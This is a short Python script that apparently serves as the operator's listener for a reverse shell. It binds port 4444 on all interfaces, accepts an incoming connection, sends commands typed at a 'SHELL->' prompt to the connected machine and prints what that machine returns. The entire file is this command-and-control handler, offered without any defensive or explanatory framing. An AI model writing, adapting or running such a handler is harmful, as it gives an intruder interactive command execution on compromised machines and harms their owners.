import socket
import sys

def server(port: int = 4444):
    # create tcp socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',port))
    s.listen(9)
    
    myHost = socket.gethostbyname(socket.gethostname())
    print(f'[+] server is listen on port {myHost}:{port}')

    conn, addr = s.accept()
    print(f'[+] Connection from {addr[0]}:{addr[1]}')
    
    # send shell prompt
    conn.send('Enter Command '.encode())

    while True:
        try:
            conn.send(str(input('SHELL-> ')).encode())

            result = conn.recv(2048).decode()
            # exit conditions
            if result.lower() == 'exit' or result == '':
                s.close()
                print(f'[-] Exiting...')
                sys.exit(-1)
            print(result)
    
        except KeyboardInterrupt:
            s.close()
            print(f'[-] Exit...')
            sys.exit(-1)

server(4444)